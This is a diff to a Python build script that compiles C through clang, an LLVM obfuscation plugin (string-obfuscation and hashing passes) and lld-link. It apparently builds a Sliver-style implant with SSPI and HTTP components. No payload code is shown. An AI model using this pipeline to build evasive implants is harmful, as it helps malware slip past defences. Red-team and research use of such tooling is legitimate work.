@@ -1,12 +1,12 @@
 import subprocess
 import os
 
-clang_args = ["clang", "-O0", "-emit-llvm", "-S", "Test\\main.c", "-I", "D:\\Documents\\Github\\systeminformer-master\\phnt\\include", "-I", ".\\Utils", "-I", ".\\Communication", "-disable-O0-optnone", "-o", ".\\build\\main.ll"]
+clang_args = ["clang", "-Od", "/GS", "-MT", "-emit-llvm", "-S", "Test\\main.c", "-I", "D:\\Documents\\Github\\systeminformer-master\\phnt\\include", "-I", ".\\Utils", "-I", ".\\Communication", "-disable-O0-optnone", "-o", ".\\build\\main.ll"]
 # opt_args = ['opt', '--load-pass-plugin=D:\\Temp\\vs-windows-llvm\\build\\lib\\Debug\\vs-windows-llvm.dll', '--passes=my-obf-str', '.\\build\\main.ll']
 opt_args = ['opt', '-S', '--load-pass-plugin=D:\\Temp\\vs-windows-llvm\\build\\lib\\Debug\\vs-windows-llvm.dll', '--passes=hashing', '.\\build\\main.ll']
 llc_args = ['llc', '-filetype=obj', '-O0', '.\\build\\obfuscated-build\\main.ll']
 pdb_path = os.getcwd() + "\\main.pdb"
-lld_args = ['lld-link', '/debug', '/SUBSYSTEM:CONSOLE', '/machine:X64', '/dynamicbase:no', '/incremental:no', '/libpath:"C:\\Program Files (x86)\\Windows Kits\\10\\Lib\\10.0.22621.0\\um\\x64\\"', '/out:.\\bin\\main.exe', 'main.obj', 'Sliver.obj', 'Handler.obj', 'sspi.obj', 'Utils.lib', 'Communication.lib']
+lld_args = ['lld-link', '/debug', '/SUBSYSTEM:CONSOLE', '/machine:X64', '/dynamicbase:no', '/entry:main', '/incremental:no', '/libpath:"C:\\Program Files (x86)\\Windows Kits\\10\\Lib\\10.0.22621.0\\um\\x64\\"', '/out:.\\bin\\main.exe', 'main.obj', 'Sliver.obj', 'Handler.obj', 'sspi.obj', 'Utils.lib', 'Communication.lib']
 libs = ['user32.lib', 'kernel32.lib', 'shell32.lib', 'Version.lib', 'iphlpapi.lib', 'oleaut32.lib', 'msvcrt.lib', 'comdlg32.lib', 'dbghelp.lib', 'Ole32.lib', 'ws2_32.lib', 'crypt32.lib', 'taskschd.lib', 'wbemuuid.lib', 'bcrypt.lib', 'ntdll.lib', 'winhttp.lib', 'ShLwApi.lib', 'strsafe.lib', 'wininet.lib', 'advapi32.lib', 'wtsapi32.lib']
 targeted_dir = ['Test', 'Utils', 'Communication']
 
